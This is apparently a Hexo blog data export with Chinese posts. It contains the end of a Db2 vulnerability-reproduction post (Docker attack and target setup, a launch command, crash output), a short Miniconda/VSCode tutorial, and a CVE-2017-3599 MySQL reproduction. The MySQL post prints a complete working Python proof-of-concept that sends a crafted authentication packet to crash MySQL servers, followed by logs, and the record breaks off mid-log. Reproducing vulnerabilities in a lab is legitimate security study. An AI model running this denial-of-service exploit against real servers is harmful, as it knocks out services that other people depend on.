class=\"comment\">#     ./db2icrt -u db2inst1 db2inst1 </span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RUN db2 create database KHYX_YS using codeset GBK territory CN</span></span><br><span class=\"line\"><span class=\"comment\"># RUN db2 create database KHYX_YS </span></span><br><span class=\"line\"><span class=\"comment\"># RUN db2set –all</span></span><br><span class=\"line\">COPY entrypoint.sh /entrypoint.sh</span><br><span class=\"line\">COPY exp.sh /exp.sh</span><br><span class=\"line\">COPY select.sql /select.sql</span><br><span class=\"line\">COPY crash.sql /crash.sql</span><br><span class=\"line\"></span><br><span class=\"line\">RUN <span class=\"built_in\">chmod</span> +x /entrypoint.sh</span><br><span class=\"line\">RUN <span class=\"built_in\">chmod</span> +x /exp.sh</span><br><span class=\"line\"></span><br><span class=\"line\">ENV REMOTE_IP=<span class=\"variable\">$&#123;REMOTE_IP&#125;</span></span><br><span class=\"line\">ENV REMOTE_PORT=<span class=\"variable\">$&#123;REMOTE_PORT&#125;</span></span><br><span class=\"line\">ENTRYPOINT [<span class=\"string\">&quot;/entrypoint.sh&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">EXPOSE 60000</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>镜像构建（获得docker_image_id_1）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build .</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"被测环境搭建\"><a href=\"#被测环境搭建\" class=\"headerlink\" title=\"被测环境搭建\"></a>被测环境搭建</h2><ul>\n<li><p><code>create_table.sql</code>:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> DATABASE testdb3</span><br><span class=\"line\"><span class=\"keyword\">connect</span> <span class=\"keyword\">to</span> testdb3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> tbl4 (stu_name <span class=\"type\">CHAR</span>(<span class=\"number\">10</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">PRIMARY</span> KEY)</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> tbl4 <span class=\"keyword\">ADD</span> <span class=\"keyword\">COLUMN</span> stu_age <span class=\"type\">CHAR</span>(<span class=\"number\">10</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;alice&#x27;</span>,<span class=\"string\">&#x27;20&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;bob&#x27;</span>,<span class=\"string\">&#x27;16&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;tom&#x27;</span>,<span class=\"string\">&#x27;19&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;john&#x27;</span>,<span class=\"string\">&#x27;32&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;amy&#x27;</span>,<span class=\"string\">&#x27;13&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;france&#x27;</span>,<span class=\"string\">&#x27;56&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> tbl4 <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;frank&#x27;</span>,<span class=\"string\">&#x27;41&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> tbl4</span><br></pre></td></tr></table></figure></li>\n<li><p><code>entrypoint.sh</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class=\"built_in\">echo</span> pass</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class=\"line\">./db2icrt -u db2inst1 db2inst1 </span><br><span class=\"line\"></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2stop&quot;</span></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;db2start&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">su - db2inst1 -c <span class=\"string\">&quot;cd / &amp;&amp; db2 -f create_table.sql&quot;</span></span><br></pre></td></tr></table></figure></li>\n<li><p><code>Dockerfile</code>:</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM centos:7.2.1511</span><br><span class=\"line\"></span><br><span class=\"line\">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN <span class=\"built_in\">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class=\"line\">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class=\"line\"></span><br><span class=\"line\">RUN ipcs -l</span><br><span class=\"line\"></span><br><span class=\"line\">RUN groupadd -g 901 db2iadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 902 db2fadm1 &amp;&amp; \\</span><br><span class=\"line\">    groupadd -g 903 dasadm1  &amp;&amp; \\</span><br><span class=\"line\">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \\ </span><br><span class=\"line\">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \\</span><br><span class=\"line\">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\\</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class=\"line\"></span><br><span class=\"line\">COPY entrypoint.sh /entrypoint.sh</span><br><span class=\"line\"><span class=\"comment\"># COPY exp.sh /exp.sh</span></span><br><span class=\"line\">COPY create_table.sql /create_table.sql</span><br><span class=\"line\"><span class=\"comment\"># COPY crash.sql /crash.sql</span></span><br><span class=\"line\"></span><br><span class=\"line\">RUN <span class=\"built_in\">chmod</span> +x /entrypoint.sh</span><br><span class=\"line\"><span class=\"comment\"># RUN chmod +x /exp.sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ENV REMOTE_IP=$&#123;REMOTE_IP&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ENTRYPOINT [<span class=\"string\">&quot;/entrypoint.sh&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">EXPOSE 60000</span><br><span class=\"line\"><span class=\"comment\"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>镜像构建（获得docker_image_id_2）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build.</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"被测环境容器启动（比较慢）\"><a href=\"#被测环境容器启动（比较慢）\" class=\"headerlink\" title=\"被测环境容器启动（比较慢）\"></a>被测环境容器启动（比较慢）</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -d --privileged -p 60000:60000  docker_image_id_2</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击脚本执行\"><a href=\"#攻击脚本执行\" class=\"headerlink\" title=\"攻击脚本执行\"></a>攻击脚本执行</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># REMOTE_IP为被测环境的ip</span></span><br><span class=\"line\"><span class=\"comment\"># REMOTE_PORT为被测环境的端口</span></span><br><span class=\"line\"><span class=\"comment\"># docker_image_id_1 为攻击镜像id</span></span><br><span class=\"line\"></span><br><span class=\"line\">docker run --network host -it -d --privileged -e REMOTE_IP=<span class=\"string\">&#x27;192.168.33.44&#x27;</span> -e REMOTE_PORT=<span class=\"string\">&#x27;60000&#x27;</span> docker_image_id_1</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"攻击成功效果\"><a href=\"#攻击成功效果\" class=\"headerlink\" title=\"攻击成功效果\"></a>攻击成功效果</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">……（此处省略n行）……</span><br><span class=\"line\"></span><br><span class=\"line\">[+] 已连接成功目标数据库</span><br><span class=\"line\">[+] 正在查询目标数据库数据</span><br><span class=\"line\"></span><br><span class=\"line\">STU_NAME   STU_AGE   </span><br><span class=\"line\">---------- ----------</span><br><span class=\"line\">alice      20        </span><br><span class=\"line\">bob        16        </span><br><span class=\"line\">tom        19        </span><br><span class=\"line\">john       32        </span><br><span class=\"line\">amy        13        </span><br><span class=\"line\">france     56        </span><br><span class=\"line\">frank      41        </span><br><span class=\"line\"></span><br><span class=\"line\">7 record(s) selected.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[+] 正在发送PoC</span><br><span class=\"line\">[+] PoC发送成功</span><br><span class=\"line\">[+] 再次尝试查询数据库</span><br><span class=\"line\">SQL1024N  A database connection does not exist.  SQLSTATE=08003</span><br></pre></td></tr></table></figure>"},{"title":"Miniconda+Vscode Python 环境管理","date":"2024-01-07T07:18:24.000Z","_content":"\n## 0 Miniconda 安装\n* 下载安装，可以安装Miniconda，也可以安装Anaconda，Miniconda轻量级。\n* 安装选项：一路next，有一页path处，全选。\n## 1 Vscode配置\n* 安装Python扩展\n* 设置扩展，将conda path添加到设置中\n    ![Conda Path](condapath.png)\n* 新建终端后，默认Python环境为miniconda的base虚拟环境\n## 2 VScode中使用conda管理python环境\n* 在vscode中使用conda Prompt：[终端]->[新建终端]->[＋]->[command prompt]\n\t* conda info --envs 查看当前虚拟环境列表\n\t* conda activate -n envsname 启动虚拟环境（默认为base）\n\t* 可以看到启动后前面有（envsname）\n## 3 常用conda命令\n* 查看所有环境\tconda info --envs\n* 创建新环境\tconda create -n env_name python=x.x\n* 启动虚拟环境\tconda activate env_name\n* 退出虚拟环境\tconda deactivate\n* 删除虚拟环境\tconda remove -n env_name  --all\n\n\n\n> 本文内容首发于CSDN：[Miniconda+Vscode Python 环境管理](https://blog.csdn.net/weixin_43694227/article/details/124099269)","source":"_posts/Miniconda-Vscode-Python-环境管理.md","raw":"---\ntitle: Miniconda+Vscode Python 环境管理\ndate: 2024-01-07 15:18:24\ntags: \n    - Miniconda\n    - Vscode \n    - Python环境管理\ncategories:\n---\n\n## 0 Miniconda 安装\n* 下载安装，可以安装Miniconda，也可以安装Anaconda，Miniconda轻量级。\n* 安装选项：一路next，有一页path处，全选。\n## 1 Vscode配置\n* 安装Python扩展\n* 设置扩展，将conda path添加到设置中\n    ![Conda Path](condapath.png)\n* 新建终端后，默认Python环境为miniconda的base虚拟环境\n## 2 VScode中使用conda管理python环境\n* 在vscode中使用conda Prompt：[终端]->[新建终端]->[＋]->[command prompt]\n\t* conda info --envs 查看当前虚拟环境列表\n\t* conda activate -n envsname 启动虚拟环境（默认为base）\n\t* 可以看到启动后前面有（envsname）\n## 3 常用conda命令\n* 查看所有环境\tconda info --envs\n* 创建新环境\tconda create -n env_name python=x.x\n* 启动虚拟环境\tconda activate env_name\n* 退出虚拟环境\tconda deactivate\n* 删除虚拟环境\tconda remove -n env_name  --all\n\n\n\n> 本文内容首发于CSDN：[Miniconda+Vscode Python 环境管理](https://blog.csdn.net/weixin_43694227/article/details/124099269)","slug":"Miniconda-Vscode-Python-环境管理","published":1,"updated":"2024-01-08T13:51:54.078Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clrkqvviq0003foi8gi6mhmk5","content":"<h2 id=\"0-Miniconda-安装\"><a href=\"#0-Miniconda-安装\" class=\"headerlink\" title=\"0 Miniconda 安装\"></a>0 Miniconda 安装</h2><ul>\n<li>下载安装，可以安装Miniconda，也可以安装Anaconda，Miniconda轻量级。</li>\n<li>安装选项：一路next，有一页path处，全选。</li>\n</ul>\n<h2 id=\"1-Vscode配置\"><a href=\"#1-Vscode配置\" class=\"headerlink\" title=\"1 Vscode配置\"></a>1 Vscode配置</h2><ul>\n<li>安装Python扩展</li>\n<li>设置扩展，将conda path添加到设置中<br>  <img src=\"/2024/01/07/Miniconda-Vscode-Python-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/condapath.png\" alt=\"Conda Path\"></li>\n<li>新建终端后，默认Python环境为miniconda的base虚拟环境</li>\n</ul>\n<h2 id=\"2-VScode中使用conda管理python环境\"><a href=\"#2-VScode中使用conda管理python环境\" class=\"headerlink\" title=\"2 VScode中使用conda管理python环境\"></a>2 VScode中使用conda管理python环境</h2><ul>\n<li>在vscode中使用conda Prompt：[终端]-&gt;[新建终端]-&gt;[＋]-&gt;[command prompt]<ul>\n<li>conda info –envs 查看当前虚拟环境列表</li>\n<li>conda activate -n envsname 启动虚拟环境（默认为base）</li>\n<li>可以看到启动后前面有（envsname）</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"3-常用conda命令\"><a href=\"#3-常用conda命令\" class=\"headerlink\" title=\"3 常用conda命令\"></a>3 常用conda命令</h2><ul>\n<li>查看所有环境\tconda info –envs</li>\n<li>创建新环境\tconda create -n env_name python&#x3D;x.x</li>\n<li>启动虚拟环境\tconda activate env_name</li>\n<li>退出虚拟环境\tconda deactivate</li>\n<li>删除虚拟环境\tconda remove -n env_name  –all</li>\n</ul>\n<blockquote>\n<p>本文内容首发于CSDN：<a href=\"https://blog.csdn.net/weixin_43694227/article/details/124099269\">Miniconda+Vscode Python 环境管理</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0-Miniconda-安装\"><a href=\"#0-Miniconda-安装\" class=\"headerlink\" title=\"0 Miniconda 安装\"></a>0 Miniconda 安装</h2><ul>\n<li>下载安装，可以安装Miniconda，也可以安装Anaconda，Miniconda轻量级。</li>\n<li>安装选项：一路next，有一页path处，全选。</li>\n</ul>\n<h2 id=\"1-Vscode配置\"><a href=\"#1-Vscode配置\" class=\"headerlink\" title=\"1 Vscode配置\"></a>1 Vscode配置</h2><ul>\n<li>安装Python扩展</li>\n<li>设置扩展，将conda path添加到设置中<br>  <img src=\"/2024/01/07/Miniconda-Vscode-Python-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/condapath.png\" alt=\"Conda Path\"></li>\n<li>新建终端后，默认Python环境为miniconda的base虚拟环境</li>\n</ul>\n<h2 id=\"2-VScode中使用conda管理python环境\"><a href=\"#2-VScode中使用conda管理python环境\" class=\"headerlink\" title=\"2 VScode中使用conda管理python环境\"></a>2 VScode中使用conda管理python环境</h2><ul>\n<li>在vscode中使用conda Prompt：[终端]-&gt;[新建终端]-&gt;[＋]-&gt;[command prompt]<ul>\n<li>conda info –envs 查看当前虚拟环境列表</li>\n<li>conda activate -n envsname 启动虚拟环境（默认为base）</li>\n<li>可以看到启动后前面有（envsname）</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"3-常用conda命令\"><a href=\"#3-常用conda命令\" class=\"headerlink\" title=\"3 常用conda命令\"></a>3 常用conda命令</h2><ul>\n<li>查看所有环境\tconda info –envs</li>\n<li>创建新环境\tconda create -n env_name python&#x3D;x.x</li>\n<li>启动虚拟环境\tconda activate env_name</li>\n<li>退出虚拟环境\tconda deactivate</li>\n<li>删除虚拟环境\tconda remove -n env_name  –all</li>\n</ul>\n<blockquote>\n<p>本文内容首发于CSDN：<a href=\"https://blog.csdn.net/weixin_43694227/article/details/124099269\">Miniconda+Vscode Python 环境管理</a></p>\n</blockquote>\n"},{"title":"CVE-2017-3599漏洞复现","date":"2024-01-14T13:44:55.000Z","_content":"\n## 参考链接\n\n[MySQL < 5.6.35 / < 5.7.17 - Integer Overflow - Multiple dos Exploit](https://www.exploit-db.com/exploits/41954)\n\n## 漏洞说明\n\n> Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. Easily “exploitable” vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H). NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql/auth/sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.\n\n## 被测环境\n\n- docker镜像：`mysql:5.6.35`\n- 启动被测环境容器：`docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 pmysql:5.6.35`\n\n## POC脚本\n\n```python\n# python2.7\n\n'''\n# Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py\n# Exploit Title: Remote MySQL DOS (Integer Overflow)\n# Google Dork: N/A\n# Date: 13th April 2017\n# Exploit Author: Rodrigo Marcos\n# Vendor Homepage: https://www.mysql.com/\n# Software Link: https://www.mysql.com/downloads/\n# Version: 5.6.35 and below / 5.7.17 and below\n# Tested on: N/A\n# CVE : CVE-2017-3599\n'''\n\nimport socket \nimport sys\nfrom struct import pack\n\n'''\nCVE-2017-3599 Proof of Concept exploit code.\n\nhttps://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/\n\nRodrigo Marcos\n\n'''\n\nif len(sys.argv)<2:\n\n    print \"Usage: python \" + sys.argv[0] + \" host [port]\"\n    exit(0)\n\nelse:\n    HOST = sys.argv[1]\n\n    if len(sys.argv)>2:\n        PORT = int(sys.argv[2]) # Yes, no error checking... living on the wild side!\n    else:\n        PORT = 3306\n\nprint \"[+] Creating packet...\"\n\n'''\n3 bytes\t\tPacket lenth\n1 bytes \tPacket number\n\nLogin request:\n\nPacket format (when the server is 4.1 or newer):\n\nBytes       Content\n-----       ----\n4           client capabilities\n4           max packet size\n1           charset number\n23          reserved (always 0)\nn           user name, \\0-terminated\nn           plugin auth data (e.g. scramble), length encoded\nn           database name, \\0-terminated\n            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)\nn           client auth plugin name - \\0-terminated string,\n            (if CLIENT_PLUGIN_AUTH is set in the capabilities)\n\n'''\n\n# packet_len = '\\x64\\x00\\x00'\n\npacket_num = '\\x01'\n\n#Login request packet\npacket_cap = '\\x85\\xa2\\xbf\\x01'\t\t# client capabilities (default)\npacket_max = '\\x00\\x00\\x00\\x01'\t\t# max packet size (default)\npacket_cset = '\\x21'\t\t\t\t# charset (default)\np_reserved = '\\x00' * 23 \t\t\t# 23 bytes reserved with nulls (default)\npacket_usr =  'test\\x00' \t\t\t# username null terminated (default)\n\npacket_auth  = '\\xff'\t\t\t# both \\xff and \\xfe crash the server\n\n'''\nConditions to crash:\n\n1 - packet_auth must start with \\xff or \\xfe\n2 - packet_auth must be shorter than 8 chars\n\nThe expected value is the password, which could be of two different formats\n(null terminated or length encoded) depending on the client functionality.\n'''\n\npacket = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth \npacket_len = pack('i',len(packet))[:3]\n\nrequest = packet_len + packet_num + packet\n\nprint \"[+] Connecting to host...\"\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    print \"[+] Connected.\"\n\nexcept:\n    print \"[+] Unable to connect to host \" + HOST + \" on port \" + str(PORT) + \".\"\t\n    s.close()\n    print \"[+] Exiting.\"\n    exit(0)\n\nprint \"[+] Receiving greeting from remote host...\"\ndata = s.recv(1024)\nprint \"[+] Done.\"\n\nprint \"[+] Sending our payload...\"\ns.send(request)\nprint \"[+] Done.\"\n#print \"Our data: %r\" % request\n\ns.close()\n```\n\n## 攻击执行\n\n```sh\npython poc.py IP 3306\n```\n\n## 攻击效果\n\n```sh\n拒绝服务，查看数据库的容器日志：\n\nroot@yml-penetration:~/Workspace/cve-2017-3599# docker logs 100\nInitializing database\n2023-12-19 12:19:33 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.\n2023-12-19 12:19:33 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 36 ...\n2023-12-19 12:19:33 36 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:33 36 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:33 36 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:33 36 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:33 36 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:33 36 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:33 36 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:33 36 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:33 36 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:33 36 [Note] InnoDB: The first specified data file ./ibdata1 did not exist: a new database to be created!\n2023-12-19 12:19:33 36 [Note] InnoDB: Setting file ./ibdata1 size to 12 MB\n2023-12-19 12:19:33 36 [Note] InnoDB: Database physically writes the file full: wait...\n2023-12-19 12:19:33 36 [Note] InnoDB: Setting log file ./ib_logfile101 size to 48 MB\n2023-12-19 12:19:33 36 [Note] InnoDB: Setting log file ./ib_logfile1 size to 48 MB\n2023-12-19 12:19:34 36 [Note] InnoDB: Renaming log file ./ib_logfile101 to ./ib_logfile0\n2023-12-19 12:19:34 36 [Warning] InnoDB: New log files created, LSN=45781\n2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer not found: creating new\n2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer created\n2023-12-19 12:19:34 36 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:34 36 [Warning] InnoDB: Creating foreign key constraint system tables.\n2023-12-19 12:19:34 36 [Note] InnoDB: Foreign key constraint system tables created\n2023-12-19 12:19:34 36 [Note] InnoDB: Creating tablespace and datafile system tables.\n2023-12-19 12:19:34 36 [Note] InnoDB: Tablespace and datafile system tables created.\n2023-12-19 12:19:34 36 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:34 36 [Note] InnoDB: 5.6.35 started; log sequence number 0\n2023-12-19 12:19:36 36 [Note] Binlog end\n2023-12-19 12:19:36 36 [Note] InnoDB: FTS optimize thread exiting.\n2023-12-19 12:19:36 36 [Note] InnoDB: Starting shutdown...\n2023-12-19 12:19:38 36 [Note] InnoDB: Shutdown completed; log sequence number 1625977\n\n\n2023-12-19 12:19:38 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.\n2023-12-19 12:19:38 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 59 ...\n2023-12-19 12:19:38 59 [Note] InnoDB: Using atomics to ref count buffer pool pages\n2023-12-19 12:19:38 59 [Note] InnoDB: The InnoDB memory heap is disabled\n2023-12-19 12:19:38 59 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins\n2023-12-19 12:19:38 59 [Note] InnoDB: Memory barrier is not used\n2023-12-19 12:19:38 59 [Note] InnoDB: Compressed tables use zlib 1.2.8\n2023-12-19 12:19:38 59 [Note] InnoDB: Using Linux native AIO\n2023-12-19 12:19:38 59 [Note] InnoDB: Not using CPU crc32 instructions\n2023-12-19 12:19:38 59 [Note] InnoDB: Initializing buffer pool, size = 128.0M\n2023-12-19 12:19:38 59 [Note] InnoDB: Completed initialization of buffer pool\n2023-12-19 12:19:38 59 [Note] InnoDB: Highest supported file format is Barracuda.\n2023-12-19 12:19:38 59 [Note] InnoDB: 128 rollback segment(s) are active.\n2023-12-19 12:19:38 59 [Note] InnoDB: Waiting for purge to start\n2023-12-19 12:19:38 59 [Note] InnoDB: 5.6.35 started; log sequence number 1625977\n2023-12-19 12:19:38 59 [Note] Binlog end\n2023-12-19 12:19:38 59 [Note] InnoDB: FTS optimize thread exiting.\n2023-12-19 12:19:38 59 [Note] InnoDB: Starting shutdown...\n2023-12-19 12:19:40 59 [Note] InnoDB: Shutdown completed; log sequence number 1625987\n\n\n\n\nPLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !\nTo do so, start the server, then issue the following commands:\n\n/usr/bin/mysqladmin -u root password 'new-password'\n/usr/bin/mysqladmin -u root -h 100bfe039d09 password 'new-password'\n\nAlternatively you can run:\n\n/usr/bin/mysql_secure_installation\n\nwhich will also give you the option of removing the test\ndatabases and anonymous user created by default.  This is\nstrongly recommended for production servers.\n\nSee the manual for more instructions.\n\nPlease report any problems at http://bugs.mysql.com/\n\nThe latest information about MySQL is available on the web at\n\nhttp://www.mysql.com\n\nSupport MySQL by buying support/licenses at http://shop.mysql.com\n\nNote: new default config file not created.\nPlease make sure your config file is current\n\nWARNING: Default config file /etc/mysql/my.cnf exists on the system\nThis file will be read by default by the MySQL server\nIf you do not want to use this, either remove it, or use 